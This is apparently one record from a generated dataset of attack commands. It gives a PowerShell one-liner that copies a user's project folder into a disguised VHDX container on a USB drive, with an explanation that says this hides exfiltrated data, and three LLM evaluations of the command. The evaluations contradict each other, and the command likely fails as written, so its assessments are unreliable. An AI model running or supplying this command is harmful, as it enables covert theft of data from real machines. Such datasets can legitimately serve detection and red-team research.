command: $usb=(Get-Disk | Where-Object BusType -eq 'USB' | Select-Object -First 1); $drv=(Get-Partition -DiskNumber $usb.Number | Where-Object DriveLetter | Select-Object -First 1 -ExpandProperty DriveLetter); $vhd="$drv:\System\cache.vhdx"; New-Item -Path (Split-Path $vhd) -ItemType Directory -Force | Out-Null; New-VHD -Path $vhd -SizeBytes 2147483648 -Dynamic | Out-Null; Mount-DiskImage -ImagePath $vhd; $v=(Get-DiskImage $vhd | Get-Disk | Get-Partition | Where-Object DriveLetter | Get-Volume | Select-Object -First 1 -ExpandProperty DriveLetter); Format-Volume -DriveLetter $v -FileSystem NTFS -Force -Confirm:$false | Out-Null; Copy-Item "C:\Projects\*" "$v:\" -Recurse -Force; Dismount-DiskImage -ImagePath $vhd
explanation: Creates and mounts a VHDX on the USB, formats it, copies project data inside, and dismounts, hiding exfil data within a single container file on removable media.
rationale_steps: Find USB disk and determine its drive letter.
Create a VHDX file on the USB and mount it.
Format the mounted volume, copy data into it, then dismount to encapsulate data in the VHDX.

llm_judgments.syntactic_justification: The command is well-formed and parseable with balanced quoting and separators, but uses Where-Object without a scriptblock or comparison (e.g., 'Where-Object DriveLetter'), which will cause parameter binding issues at runtime.
llm_judgments.semantic_justification: It conceptually aligns with exfiltration to removable media via a VHDX container, but will likely fail without admin rights and missing disk initialization/partitioning steps for the new VHD, making successful formatting and copying unlikely.

llm_judgments.syntactic_justification: The PowerShell command is well-formed with balanced parentheses, proper semicolon separators, valid cmdlet names, correct parameter syntax, and consistent variable references throughout the pipeline chain.
llm_judgments.semantic_justification: The command precisely implements T1052 by detecting a USB drive, creating a hidden VHDX container file in a plausible system directory, mounting and formatting it, recursively copying project data into the container, then dismounting it — effectively concealing exfiltrated data within a single opaque container file on removable media, which is operationally realistic and technically accurate.

llm_judgments.syntactic_justification: The script is a well-formed PowerShell one-liner using standard cmdlet syntax, proper piping, and balanced punctuation.
llm_judgments.semantic_justification: The logic perfectly aligns with the exfiltration technique by hiding data in a container on a USB drive, but the commands New-VHD and Format-Volume require Administrative privileges, contradicting the 'None' privilege metadata.
